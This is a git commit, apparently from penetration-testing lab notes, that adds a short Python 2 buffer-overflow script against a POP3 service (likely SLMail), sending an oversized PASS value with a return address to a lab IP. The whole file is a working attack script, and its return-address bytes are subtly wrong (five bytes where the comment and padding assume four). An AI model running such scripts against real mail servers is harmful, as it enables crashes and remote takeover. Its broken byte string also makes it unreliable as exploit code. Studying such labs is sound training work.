67ae55ed7161822e0bbdebd1429b75dd7733ea97
John Moss <john@stolen-bikes.co.uk>
2016-06-18 19:59:20 +0100

    Create pop3-sl-jumpconfimation.py

---
+++ notes/buffer-overflow/pop3-sl-jumpconfimation.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+0x5f4a358f
+buffer = 'A'*2606 + '\x8f\x35\x35\x4a\x5f' + 'C'*(2700-2606-4)
+
+try:
+	print "\n sending evil buffer..."
+	s.connect(('10.11.5.115', 110))
+	data = s.recv(1024)
+	s.send('USER test\r\n')
+	data = s.recv(1024)
+	s.send('PASS '+buffer+'\r\n')
+	print "\nDone!."
+except:
+	print "Could not connect to POP3!"
